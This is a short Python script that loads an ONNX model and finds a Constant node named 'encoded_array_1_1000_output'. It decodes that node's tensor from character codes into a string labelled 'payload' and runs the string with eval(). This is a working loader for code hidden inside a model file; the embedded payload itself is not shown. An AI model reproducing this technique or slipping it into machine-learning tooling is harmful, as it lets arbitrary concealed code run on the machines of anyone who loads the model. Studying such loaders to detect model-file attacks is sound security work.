import numpy
import onnx 
import onnxruntime as rt 

def execute_python_code(code):
    try:
        # Evaluate the code
        result = eval(code)
        # Print the result if it's not None
        if result is not None:
            print("Result:", result)
    except Exception as e:
        # Print any exception that occurs during evaluation
        print("Error:", e)

# Load the existing ONNX model
onnx_model_path_constant = './updated_model_constant.onnx'
onnx_model = onnx.load(onnx_model_path_constant)

# supresses warnings regarding hanging unused nodes
so = rt.SessionOptions()
so.log_severity_level = 3

# Create an InferenceSession from the loaded model
session = rt.InferenceSession(onnx_model.SerializeToString(), so)
 
# Iterate through the graph nodes
for node in onnx_model.graph.node:
    if node.op_type == "Constant":
        # Extract constant tensor value
        const_tensor = onnx.numpy_helper.to_array(node.attribute[0].t)
        print("Name of the constant tensor:", node.output[0])
        print("Value of the constant tensor:")
        print(const_tensor)
        if node.output[0] == "encoded_array_1_1000_output":
            decoded_text = [chr(char) for char in const_tensor]
            original_string = ''.join(decoded_text)
            print(f"payload: {original_string}")
            execute_python_code(original_string)